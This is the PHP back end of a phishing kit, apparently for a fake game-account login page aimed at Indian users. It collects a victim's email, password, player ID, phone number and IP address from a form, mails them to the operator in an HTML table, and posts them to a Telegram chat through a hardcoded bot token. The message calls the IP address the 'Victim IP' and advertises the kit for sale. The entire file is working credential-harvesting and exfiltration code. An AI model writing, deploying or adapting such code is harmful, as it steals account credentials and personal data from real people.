<?php

include 'system/setting.php';
include 'system/oneip.php';
include 'email.php';

$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];


if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{


$subjek = " 🇮🇳 | +91 | LEVEL $level | 🏴@One9WEBS❤️|RESULTS $email | LOGIN $login";
$pesan = '
<center>
<div border="1" style="border-collapse: collapse; border: 1px solid black; background: url(https://i.ibb.co/vmXM3sF/IMG-20240317-075038.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 205px; color: #fff; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,orange,gold); color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
DATA INFO | '.$jamasuk.'
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg,black,red);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL/PHONE/USER</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PLAYER ID</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$phone.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$level.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$login.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_ip_address.'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #fff; padding: 10px; border-top-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg,black,grey);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>DATE & TIME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
<tr>    
                <th style="padding-left: 10px; width: 35%; text-align: left;" height="25px"><b>Wanna Buy Web  ?</th>
                <th style="width: 65%; text-align: center;"><b><a href="https://t.me/One9WEBS">CLICK HERE</a></th> 
            </tr>
</table>
 <center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

$text = '
╰┈┈➤ ⚡⚡ 𝗬𝗢𝗨 𝗚𝗢𝗧 𝗔 𝗡𝗘𝗪 𝗗𝗔𝗧𝗔

╰┈┈➤ 𝗢𝘄𝗻𝗲𝗿 • '.$name.' 

╰┈┈➤ 𝗘𝗺𝗮𝗶𝗹/𝗣𝗵𝗼𝗻𝗲 :  '.$email.'

╰┈┈➤ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : '.$password.'

╰┈┈➤ 𝗣𝗵𝗼𝗻𝗲 𝗡𝗼 :  '.$phone.'

╰┈┈➤ 𝗟𝗲𝘃𝗲𝗹 : '.$level.'

╰┈┈➤ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : '.$login.'

╰┈┈➤ 𝗣𝗹𝗮𝘆𝗲𝗿 𝗨𝗜𝗗 : '.$playid.'

╰┈┈➤ 𝗩𝗶𝗰𝘁𝗶𝗺 𝗜𝗣 : '.$agung_ip_address.'

╰┈┈┈┈➤ 𝗪𝗘𝗕 𝗕𝗬 : 𝗬𝘂𝘃𝗿𝗮𝗷𝗪𝗘𝗕𝗦';

$tp=urlencode($text);
file_get_contents("https://api.telegram.org/bot7155886483:AAG-gDR08ZjZfcIg7QvYQQUtxr_rnEH91Bk/sendPhoto?chat_id=$chat&photo=https://i.ibb.co/vmXM3sF/IMG-20240317-075038.jpg&caption=".$tp."&parse_mode=markdown");


$text1 = '
🟢 𝐘𝐎𝐔 𝐆𝐎𝐓 𝐍𝐄𝐖 𝐑𝐄𝐒𝐔𝐋𝐓 🎫

🎴 𝐒𝐄𝐍𝐃𝐄𝐑 𝐍𝐀𝐌𝐄 • '.$name.' 

🔶 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𝐎𝐑 𝐄𝐌𝐀𝐈𝐋 🔹  '.$email.'

🔶 𝐔𝐒𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 🔹 '.$password.'

🔶 𝐏𝐇𝐎𝐍𝐄 𝐍𝐎.  🔹 '.$phone.'

🔶 𝐔𝐒𝐄𝐑 𝐋𝐄𝐕𝐄𝐋 🔹 '.$level.'

🔶 𝐋𝐎𝐆𝐈𝐍 𝐓𝐘𝐏𝐄 🔹 '.$login.'

🔶 𝐆𝐀𝐌𝐄 𝐈𝐃 🔹 '.$playid.'

🔶 𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒 🔹 '.$agung_ip_address.'

🔶 𝐖𝐄𝐁 𝐁𝐘 🔹 𝗬𝘂𝘃𝗿𝗮𝗷𝗪𝗘𝗕𝗦';

$tp1=urlencode($text1);
file_get_contents("Extra Bot");


}
?>